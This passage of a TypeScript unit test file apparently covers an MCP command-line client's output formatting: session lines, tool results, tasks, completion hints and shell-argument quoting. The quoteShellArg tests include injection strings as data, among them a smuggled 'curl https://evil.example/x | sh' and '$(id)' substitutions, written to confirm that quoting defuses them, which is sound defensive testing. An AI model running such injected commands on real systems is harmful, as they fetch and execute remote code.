    // Should NOT show "Messages (1):" header
    expect(output).not.toContain('Messages (1):');
  });
});

describe('formatSessionLine', () => {
  it('should format HTTP session with all fields', () => {
    const session: SessionData = {
      name: '@test',
      server: { url: 'https://mcp.example.com' },
      profileName: 'default',
      protocolVersion: '2025-11-25',
      createdAt: '2025-01-01T00:00:00Z',
    };

    const output = formatSessionLine(session);

    expect(output).toContain('@test');
    expect(output).toContain('https://mcp.example.com');
    expect(output).not.toContain('HTTP');
    expect(output).toContain('OAuth');
    expect(output).toContain('default');
    expect(output).not.toContain('MCP:');
  });

  it('should format stdio session', () => {
    const session: SessionData = {
      name: '@fs',
      server: {
        command: 'npx',
        args: ['-y', '@modelcontextprotocol/server-filesystem', '/tmp'],
      },
      createdAt: '2025-01-01T00:00:00Z',
    };

    const output = formatSessionLine(session);

    expect(output).toContain('@fs');
    expect(output).toContain('npx');
    expect(output).not.toContain('stdio');
  });

  it('should include proxy info when configured', () => {
    const session: SessionData = {
      name: '@proxy-test',
      server: { url: 'https://mcp.example.com' },
      proxy: { host: '127.0.0.1', port: 8080 },
      createdAt: '2025-01-01T00:00:00Z',
    };

    const output = formatSessionLine(session);

    expect(output).toContain('@proxy-test');
    expect(output).toContain('[proxy:');
    expect(output).toContain('127.0.0.1:8080');
  });

  it('should include proxy with custom host', () => {
    const session: SessionData = {
      name: '@proxy-custom',
      server: { url: 'https://mcp.example.com' },
      proxy: { host: '0.0.0.0', port: 3000 },
      createdAt: '2025-01-01T00:00:00Z',
    };

    const output = formatSessionLine(session);

    expect(output).toContain('0.0.0.0:3000');
  });

  it('should not include proxy info when not configured', () => {
    const session: SessionData = {
      name: '@simple',
      server: { url: 'https://mcp.example.com' },
      createdAt: '2025-01-01T00:00:00Z',
    };

    const output = formatSessionLine(session);

    expect(output).not.toContain('[proxy:');
  });
});

describe('logTarget', () => {
  let consoleSpy: MockInstance;

  beforeEach(() => {
    consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
  });

  afterEach(() => {
    consoleSpy.mockRestore();
  });

  it('should not output anything in json mode', async () => {
    await logTarget('@test', {
      outputMode: 'json',
    });

    expect(consoleSpy).not.toHaveBeenCalled();
  });

  it('should not output anything when hide is true', async () => {
    await logTarget('@test', {
      outputMode: 'human',
      hide: true,
    });

    expect(consoleSpy).not.toHaveBeenCalled();
  });
});

describe('truncateOutput', () => {
  // Import dynamically to avoid chalk mock issues
  let truncateOutput: (output: string, maxChars: number) => string;

  beforeAll(async () => {
    const mod = await import('../../../src/cli/output.js');
    truncateOutput = mod.truncateOutput;
  });

  it('returns original string when within limit', () => {
    expect(truncateOutput('short', 100)).toBe('short');
  });

  it('returns original string when exactly at limit', () => {
    const str = 'a'.repeat(100);
    expect(truncateOutput(str, 100)).toBe(str);
  });

  it('truncates long strings with a notice', () => {
    const str = 'a'.repeat(2000);
    const result = truncateOutput(str, 100);
    expect(result.length).toBeLessThan(str.length);
    expect(result).toContain('output truncated');
    expect(result).toContain('--max-chars');
    // Should show KB size for large outputs
    expect(result).toContain('2.0KB total');
  });

  it('shows character count for small outputs', () => {
    const str = 'a'.repeat(200);
    const result = truncateOutput(str, 50);
    expect(result).toContain('200 chars');
  });
});

describe('quoteShellArg', () => {
  it('leaves shell-safe skill names and URIs unquoted', () => {
    expect(quoteShellArg('git-workflow')).toBe('git-workflow');
    expect(quoteShellArg('skill://pdf/references/FORMS.md')).toBe(
      'skill://pdf/references/FORMS.md'
    );
  });

  it('quotes a value that would otherwise end the command or start another', () => {
    expect(quoteShellArg('pdf; curl https://evil.example/x | sh #')).toBe(
      '"pdf; curl https://evil.example/x | sh #"'
    );
    expect(quoteShellArg('a$(id)b')).toBe('"a\\$(id)b"');
    expect(quoteShellArg('a`id`b')).toBe('"a\\`id\\`b"');
  });

  it('escapes backslashes so they cannot neutralize the escaping of `$` or the closing quote', () => {
    // Unescaped, `\$(id)` would render as `"\\$(id)"`: a literal backslash followed by a live
    // command substitution.
    expect(quoteShellArg('\\$(id)', 'linux')).toBe('"\\\\\\$(id)"');
    expect(quoteShellArg('a b\\', 'linux')).toBe('"a b\\\\"');
    expect(quoteShellArg('\\`id`', 'linux')).toBe('"\\\\\\`id\\`"');
    expect(quoteShellArg('x\\"; id; "', 'linux')).toBe('"x\\\\\\"; id; \\""');
  });

  it.skipIf(process.platform === 'win32')(
    'round-trips hostile values through a real POSIX shell as one literal argument',
    () => {
      const hostile = [
        '\\$(echo PWNED)',
        '$(echo PWNED)',
        '`echo PWNED`',
        'a b\\',
        'x\\"; echo PWNED; "',
        '\\\\$(echo PWNED)',
        'pdf; echo PWNED #',
        'C:\\Program Files\\x $HOME',
      ];
      for (const value of hostile) {
        const out = execFileSync('sh', ['-c', `printf %s ${quoteShellArg(value, 'linux')}`], {
          encoding: 'utf8',
          env: { PATH: process.env.PATH ?? '/usr/bin:/bin' },
        });
        expect(out).toBe(value);
      }
    }
  );

  it('leaves backslashes alone on Windows, where they separate path segments', () => {
    expect(quoteShellArg('C:\\Program Files\\x', 'win32')).toBe('"C:\\Program Files\\x"');
  });
});

describe('formatPath', () => {
  it('leaves simple paths unquoted', () => {
    expect(formatPath('/Users/jan/.cursor/mcp.json')).toBe('/Users/jan/.cursor/mcp.json');
    expect(formatPath('/home/user/mcpc/mcp.json')).toBe('/home/user/mcpc/mcp.json');
  });

  it('double-quotes paths containing spaces so they can be pasted into a shell', () => {
    expect(formatPath('/Users/jan/Library/Application Support/Code/User/mcp.json')).toBe(
      '"/Users/jan/Library/Application Support/Code/User/mcp.json"'
    );
  });

  it('leaves plain Windows paths unquoted (backslash is the separator, not special)', () => {
    expect(formatPath('C:\\Users\\foo\\mcp.json', 'win32')).toBe('C:\\Users\\foo\\mcp.json');
  });

  it('quotes Windows paths with spaces, preserving backslashes verbatim', () => {
    expect(formatPath('C:\\Users\\foo bar\\mcp.json', 'win32')).toBe(
      '"C:\\Users\\foo bar\\mcp.json"'
    );
  });

  it('quotes backslash paths on POSIX, where backslash is a shell escape character', () => {
    expect(formatPath('/tmp/a\\b/mcp.json', 'linux')).toBe('"/tmp/a\\\\b/mcp.json"');
  });

  it('escapes characters that stay special inside double quotes', () => {
    expect(formatPath('/tmp/a$b/mcp.json')).toBe('"/tmp/a\\$b/mcp.json"');
    expect(formatPath('/tmp/a b"c/mcp.json')).toBe('"/tmp/a b\\"c/mcp.json"');
  });
});

describe('formatConnectStatusBadge', () => {
  it('uses the session list "live" wording for an already-connected session', () => {
    expect(formatConnectStatusBadge('active')).toContain('live');
    expect(formatConnectStatusBadge('active')).not.toContain('active');
  });

  it('renders a freshly-connected ("created") session as "live", plus the failed state', () => {
    expect(formatConnectStatusBadge('created')).toContain('live');
    expect(formatConnectStatusBadge('created')).not.toContain('created');
    expect(formatConnectStatusBadge('failed')).toContain('failed');
  });

  it('includes the failure reason when provided', () => {
    expect(formatConnectStatusBadge('failed', 'boom')).toContain('boom');
  });
});

describe('formatCallToolResultHuman', () => {
  it('should format single text content', () => {
    const result = {
      content: [{ type: 'text' as const, text: 'Hello world' }],
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Content:');
    expect(output).toContain('````');
    expect(output).toContain('Hello world');
    expect(output).not.toContain('--json');
  });

  it('should format multiple text content blocks separately', () => {
    const result = {
      content: [
        { type: 'text' as const, text: 'First block' },
        { type: 'text' as const, text: 'Second block' },
      ],
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Content:');
    expect(output).toContain('First block');
    expect(output).toContain('Second block');
    // Each block gets its own backtick wrapper
    const backtickCount = (output.match(/````/g) || []).length;
    expect(backtickCount).toBe(4); // open+close for each of the 2 blocks
  });

  it('should show Metadata section when _meta is present', () => {
    const result = {
      content: [{ type: 'text' as const, text: 'data' }],
      _meta: { usageTotalUsd: 0.005 },
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Metadata');
    expect(output).toContain('usageTotalUsd');
    expect(output).toContain('0.005');
    expect(output).toContain('Content:');
  });

  it('should skip Metadata section when _meta is empty', () => {
    const result = {
      content: [{ type: 'text' as const, text: 'data' }],
      _meta: {},
    };
    const output = formatCallToolResultHuman(result);
    expect(output).not.toContain('Metadata');
  });

  it('should show structuredContent as JSON when content is empty', () => {
    const result = {
      content: [],
      structuredContent: { key: 'value' },
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Structured content:');
    expect(output).toContain('"key"');
    expect(output).toContain('"value"');
    expect(output).not.toContain('--json');
  });

  it('should hint how to retrieve structuredContent when visible Content is present', () => {
    const result = {
      content: [{ type: 'text' as const, text: 'data' }],
      structuredContent: { key: 'value' },
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Content:');
    expect(output).toContain('data');
    expect(output).toContain('To see the `structuredContent` field, re-run with --json');
    expect(output).not.toContain('"key"');
    expect(output).not.toContain('"value"');
  });

  it('should not show structuredContent section when empty', () => {
    const result = {
      content: [{ type: 'text' as const, text: 'data' }],
      structuredContent: {},
    };
    const output = formatCallToolResultHuman(result);
    expect(output).not.toContain('Structured content');
  });

  // Since protocol 2026-07-28 (SEP-2106), structuredContent may be any JSON value,
  // not just an object — non-object values must render without key-based dedup logic.
  it('should show an array structuredContent when content is empty (SEP-2106)', () => {
    const result = {
      content: [],
      structuredContent: [1, 2, 3],
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Structured content:');
    expect(output).toContain('1');
    expect(output).toContain('3');
  });

  it('should show a primitive structuredContent when content is empty (SEP-2106)', () => {
    const result = {
      content: [],
      structuredContent: 42,
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Structured content:');
    expect(output).toContain('42');
  });

  it('should keep text content untouched alongside a non-object structuredContent', () => {
    const result = {
      content: [{ type: 'text' as const, text: 'summary' }],
      structuredContent: ['a', 'b'],
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Content:');
    expect(output).toContain('summary');
    expect(output).toContain('--json');
    expect(output).toContain('structuredContent');
    expect(output).not.toContain('Structured content:');
  });

  it('should treat a null structuredContent as absent (SEP-2106)', () => {
    const result = {
      content: [],
      structuredContent: null,
    };
    const output = formatCallToolResultHuman(result);
    expect(output).not.toContain('Structured content');
    expect(output).toContain('(no content)');
  });

  it('should skip the duplicate text block when it matches structuredContent', () => {
    const sc = { results: [{ title: 'Test', url: 'https://example.com' }] };
    const result = {
      content: [{ type: 'text' as const, text: JSON.stringify(sc) }],
      structuredContent: sc,
    };
    const output = formatCallToolResultHuman(result);
    // The duplicate text block is omitted; structuredContent section is shown instead
    expect(output).not.toContain('Content:');
    expect(output).toContain('Structured content:');
    expect(output).toContain('"results"');
    expect(output).not.toContain('--json');
  });

  it('should skip duplicate text block even when pretty-printed', () => {
    const sc = { a: 1, b: 2 };
    const result = {
      content: [{ type: 'text' as const, text: JSON.stringify(sc, null, 2) }],
      structuredContent: sc,
    };
    const output = formatCallToolResultHuman(result);
    expect(output).not.toContain('Content:');
    expect(output).toContain('Structured content:');
  });

  it.each([
    { label: 'an array', sc: ['a', 'b'] },
    { label: 'a number', sc: 42 },
    { label: 'a string', sc: 'done' },
    { label: 'a boolean', sc: false },
  ])('should skip the duplicate text block for $label structuredContent', ({ sc }) => {
    const result = {
      content: [{ type: 'text' as const, text: JSON.stringify(sc) }],
      structuredContent: sc,
    };
    const output = formatCallToolResultHuman(result);
    // Nothing is hidden, so nothing is left to point at --json for
    expect(output).not.toContain('Content:');
    expect(output).toContain('Structured content:');
    expect(output).not.toContain('--json');
  });

  it('should keep non-matching text blocks and suppress structuredContent', () => {
    const result = {
      content: [{ type: 'text' as const, text: 'Human-readable summary' }],
      structuredContent: { results: [1, 2, 3] },
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Content:');
    expect(output).toContain('Human-readable summary');
    expect(output).toContain('--json');
    expect(output).not.toContain('"results"');
  });

  it('should show structuredContent when there are no content blocks', () => {
    const result = {
      content: [],
      structuredContent: { answer: 42 },
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Structured content:');
    expect(output).toContain('"answer"');
    expect(output).toContain('42');
  });

  it('should only skip the matching text block among multiple blocks', () => {
    const sc = { key: 'val' };
    const result = {
      content: [
        { type: 'text' as const, text: 'Summary' },
        { type: 'text' as const, text: JSON.stringify(sc) },
      ],
      structuredContent: sc,
    };
    const output = formatCallToolResultHuman(result);
    // The first text block (non-matching) is kept; the JSON duplicate is omitted.
    // Since visible Content remains, show a retrieval hint for the structured data.
    expect(output).toContain('Content:');
    expect(output).toContain('Summary');
    expect(output).toContain('--json');
    expect(output).toContain('structuredContent');
    expect(output).not.toContain('"key"');
    expect(output.match(/````/g)).toHaveLength(2);
  });

  it.each([0, false, '', ['a', 'b']].map((structuredContent) => ({ structuredContent })))(
    'should hint about non-object structuredContent $structuredContent alongside visible content',
    ({ structuredContent }) => {
      const output = formatCallToolResultHuman({
        content: [{ type: 'text', text: 'Summary' }],
        structuredContent,
      });
      expect(output).toContain('Summary');
      expect(output).toContain('--json');
      expect(output).toContain('structuredContent');
      expect(output).not.toContain('Structured content:');
    }
  );

  it('should hint about structuredContent alongside non-text content', () => {
    const output = formatCallToolResultHuman({
      content: [{ type: 'image', data: 'aGVsbG8=', mimeType: 'image/png' }],
      structuredContent: { caption: 'An image' },
    });
    expect(output).toContain('[Image: image/png');
    expect(output).toContain('--json');
    expect(output).toContain('structuredContent');
    expect(output).not.toContain('"caption"');
  });

  it('should preserve the full JSON result after hiding duplicate text in human output', () => {
    const result = {
      content: [
        { type: 'text' as const, text: 'Summary' },
        { type: 'text' as const, text: '{"answer":42}' },
      ],
      structuredContent: { answer: 42 },
      _meta: { cost: 0.01 },
      isError: true,
    };
    const expectedJson = JSON.stringify(result);
    const human = formatCallToolResultHuman(result);
    expect(human).toContain('--json');
    expect(human).not.toContain('"answer"');
    expect(JSON.parse(formatOutput(result, 'json'))).toEqual(JSON.parse(expectedJson));
  });

  it('should format resource_link content blocks', () => {
    const result = {
      content: [
        {
          type: 'resource_link' as const,
          uri: 'file:///project/src/main.rs',
          name: 'main.rs',
          description: 'Entry point',
          mimeType: 'text/x-rust',
        },
      ],
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Resource link');
    expect(output).toContain('file:///project/src/main.rs');
    expect(output).toContain('main.rs');
    expect(output).toContain('Entry point');
    expect(output).toContain('text/x-rust');
  });

  it('should format image content blocks', () => {
    const result = {
      content: [
        {
          type: 'image' as const,
          data: 'aGVsbG8=',
          mimeType: 'image/png',
        },
      ],
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('[Image: image/png');
    expect(output).toContain('base64');
  });

  it('should format audio content blocks', () => {
    const result = {
      content: [
        {
          type: 'audio' as const,
          data: 'YXVkaW8=',
          mimeType: 'audio/mp3',
        },
      ],
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('[Audio: audio/mp3');
  });

  it('should format embedded resource content blocks', () => {
    const result = {
      content: [
        {
          type: 'resource' as const,
          resource: {
            uri: 'file:///data.json',
            mimeType: 'application/json',
            text: '{"key":"value"}',
          },
        },
      ],
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('Embedded resource');
    expect(output).toContain('file:///data.json');
    expect(output).toContain('application/json');
    expect(output).toContain('{"key":"value"}');
  });

  it('should return "(no content)" when result is empty', () => {
    const result = {
      content: [],
    };
    const output = formatCallToolResultHuman(result);
    expect(output).toContain('(no content)');
  });

  it('should show Content and Metadata (and suppress structuredContent) when content is non-empty', () => {
    const result = {
      _meta: { cost: 0.01 },
      content: [
        { type: 'text' as const, text: 'Some output' },
        {
          type: 'resource_link' as const,
          uri: 'file:///a.txt',
          name: 'a.txt',
        },
      ],
      structuredContent: { parsed: true },
    };
    const output = formatCallToolResultHuman(result);

    expect(output).toContain('Content:');
    expect(output).toContain('Some output');
    expect(output).toContain('Resource link');
    expect(output).toContain('Metadata:');
    expect(output).toContain('"cost"');
    expect(output).toContain('--json');
    expect(output).not.toContain('"parsed"');

    // Correct ordering: Content → structured content hint → Metadata
    expect(output.indexOf('Content:')).toBeLessThan(output.indexOf('--json'));
    expect(output.indexOf('--json')).toBeLessThan(output.indexOf('Metadata:'));
  });

  it('should show Structured content and Metadata when content is empty', () => {
    const result = {
      _meta: { cost: 0.01 },
      content: [],
      structuredContent: { parsed: true },
    };
    const output = formatCallToolResultHuman(result);

    expect(output).not.toContain('Content:');
    expect(output).toContain('Structured content:');
    expect(output).toContain('"parsed"');
    expect(output).toContain('Metadata:');
    expect(output).toContain('"cost"');

    // Correct ordering: Structured content → Metadata
    expect(output.indexOf('Structured content:')).toBeLessThan(output.indexOf('Metadata:'));
  });
});

describe('formatServerDetails with the tasks extension', () => {
  it('lists the extension and offers the task commands on a 2026-07-28 connection', () => {
    const details: ServerDetails = {
      protocolVersion: '2026-07-28',
      capabilities: {
        tools: { listChanged: false },
        extensions: { 'io.modelcontextprotocol/tasks': {} },
      },
      serverInfo: { name: 'Modern Server', version: '1.0.0' },
      connectionMode: 'stateless',
    };

    const output = formatServerDetails(details, '@modern');

    expect(output).toContain('* tasks (extension)');
    expect(output).not.toContain('not usable on MCP');
    expect(output).toContain('mcpc @modern tasks-list');
    expect(output).toContain('mcpc @modern tasks-result <taskId>');
  });

  it('flags the extension as out of era on a 2025-11-25 connection', () => {
    const details: ServerDetails = {
      protocolVersion: '2025-11-25',
      capabilities: {
        tools: { listChanged: false },
        extensions: { 'io.modelcontextprotocol/tasks': {} },
      },
      serverInfo: { name: 'Legacy Server', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@legacy');

    // The core `tasks` capability is what task commands need there, and it is absent
    expect(output).toContain('tasks (extension, not usable on MCP 2025-11-25)');
    expect(output).not.toContain('mcpc @legacy tasks-list');
    // Rendered once, not again as a generic extension line
    expect(output.match(/\* tasks/g)).toHaveLength(1);
  });
});

describe('formatTask', () => {
  const createdAt = '2026-09-23T10:00:00Z';

  it('formats a 2025-11-25 task with its ttl and poll interval', () => {
    const output = formatTask({
      taskId: 't-1',
      status: 'working',
      statusMessage: 'Step 1/3',
      createdAt,
      lastUpdatedAt: createdAt,
      ttl: 90_000,
      pollInterval: 500,
    });
    expect(output).toContain('Task ID: `t-1`');
    expect(output).toContain('working');
    expect(output).toContain('Message: Step 1/3');
    expect(output).toContain('TTL: 1.5 min');
    expect(output).toContain('Poll interval: 500 ms');
  });

  it('formats a 2026-07-28 task, including an unlimited ttl', () => {
    const output = formatTask({
      taskId: 't-2',
      status: 'working',
      createdAt,
      lastUpdatedAt: createdAt,
      ttlMs: null,
      pollIntervalMs: 5_000,
    });
    expect(output).toContain('TTL: unlimited');
    expect(output).toContain('Poll interval: 5 s');
  });

  it('points at tasks-result once a 2026-07-28 task has completed', () => {
    const output = formatTask(
      {
        taskId: 't-3',
        status: 'completed',
        createdAt,
        lastUpdatedAt: createdAt,
        ttlMs: 1000,
        result: { content: [] },
      },
      { sessionName: '@s' }
    );
    expect(output).toContain('Result: ready');
    expect(output).toContain('mcpc @s tasks-result t-3');
  });

  it('shows the error of a failed task and the requests an input_required task waits for', () => {
    const failed = formatTask({
      taskId: 't-4',
      status: 'failed',
      createdAt,
      lastUpdatedAt: createdAt,
      ttlMs: 1000,
      error: { code: -32603, message: 'disk on fire' },
    });
    expect(failed).toContain('Error: disk on fire (code -32603)');

    const waiting = formatTask({
      taskId: 't-5',
      status: 'input_required',
      createdAt,
      lastUpdatedAt: createdAt,
      ttlMs: 1000,
      inputRequests: { name: { method: 'elicitation/create', params: {} } },
    });
    expect(waiting).toContain('Waiting for: elicitation/create');
    expect(waiting).toContain('mcpc cannot answer');
  });
});

describe('formatTasks', () => {
  it('titles the 2026-07-28 listing as the tasks this session created', () => {
    const task = {
      taskId: 't-1',
      status: 'completed' as const,
      createdAt: 'x',
      lastUpdatedAt: 'x',
      ttlMs: null,
      result: {},
    };
    expect(formatTasks([task])).toContain('Tasks (1):');
    expect(formatTasks([task], { tracked: true })).toContain(
      'Tasks started from this session (1):'
    );
    expect(formatTasks([task], { tracked: true })).toContain('`t-1`');
  });
});

describe('formatCompletionResult', () => {
  const promptRef = {
    ref: { type: 'ref/prompt' as const, name: 'code_review' },
    argument: { name: 'language', value: 'py' },
  };

  it('lists one suggestion per line and hints at prompts-get with the first one', () => {
    const output = formatCompletionResult(
      { completion: { values: ['python', 'pytorch'] } },
      promptRef,
      '@test'
    );
    expect(output).toContain('python\npytorch');
    expect(output).toContain('To use it, run: mcpc @test prompts-get code_review language:=python');
    expect(output).not.toContain('Showing');
  });

  it('prints an empty state when nothing matches', () => {
    const output = formatCompletionResult({ completion: { values: [] } }, promptRef, '@test');
    expect(output).toContain('(no suggestions for language)');
    expect(output).not.toContain('prompts-get');
  });

  it('adds a footer only when the list is partial', () => {
    const complete = formatCompletionResult(
      { completion: { values: ['a', 'b'], total: 2, hasMore: false } },
      promptRef,
      '@test'
    );
    expect(complete).not.toContain('Showing');
    const partial = formatCompletionResult(
      { completion: { values: ['a', 'b'], total: 10, hasMore: true } },
      promptRef,
      '@test'
    );
    expect(partial).toContain('Showing 2 of 10 suggestions, more available');
    const untotaled = formatCompletionResult(
      { completion: { values: ['a'], hasMore: true } },
      promptRef,
      '@test'
    );
    expect(untotaled).toContain('Showing 1 suggestions, more available');
  });

  it('quotes a suggestion that is not shell-safe', () => {
    const output = formatCompletionResult(
      { completion: { values: ['Sir Reginald'] } },
      { ref: { type: 'ref/prompt', name: 'greeting' }, argument: { name: 'name', value: '' } },
      '@test'
    );
    expect(output).toContain('prompts-get greeting name:="Sir Reginald"');
  });

  it('expands the template variable into a resources-read hint', () => {
    const output = formatCompletionResult(
      { completion: { values: ['docs/readme.md'] } },
      {
        ref: { type: 'ref/resource', uri: 'file:///{path}' },
        argument: { name: 'path', value: 'do' },
      },
      '@test'
    );
    expect(output).toContain('To read it, run: mcpc @test resources-read file:///docs%2Freadme.md');
  });

  it('repeats the context arguments before the completed one in the prompts-get hint', () => {
    const output = formatCompletionResult(
      { completion: { values: ['Sir Reginald'] } },
      {
        ref: { type: 'ref/prompt', name: 'greeting' },
        argument: { name: 'name', value: '' },
        context: { arguments: { style: 'formal' } },
      },
      '@test'
    );
    expect(output).toContain('prompts-get greeting style:=formal name:="Sir Reginald"');
  });

  it('expands every supplied template variable in the resources-read hint', () => {
    const output = formatCompletionResult(
      { completion: { values: ['readme.md'] } },
      {
        ref: { type: 'ref/resource', uri: 'repo://{owner}/{file}' },
        argument: { name: 'file', value: 'r' },
        context: { arguments: { owner: 'apify' } },
      },
      '@test'
    );
    expect(output).toContain('To read it, run: mcpc @test resources-read repo://apify/readme.md');
  });

  it('points at the template list while variables remain unexpanded', () => {
    const output = formatCompletionResult(
      { completion: { values: ['apify'] } },
      {
        ref: { type: 'ref/resource', uri: 'repo://{owner}/{file}' },
        argument: { name: 'owner', value: '' },
      },
      '@test'
    );
    expect(output).not.toContain('resources-read');
    expect(output).toContain('To see the template, run: mcpc @test resources-templates-list');
  });

  it('falls back to resources-templates-list when the URI has no such variable', () => {
    const output = formatCompletionResult(
      { completion: { values: ['x'] } },
      {
        ref: { type: 'ref/resource', uri: 'file:///{other}' },
        argument: { name: 'path', value: '' },
      },
      '@test'
    );
    expect(output).toContain('To see the template, run: mcpc @test resources-templates-list');
  });
});
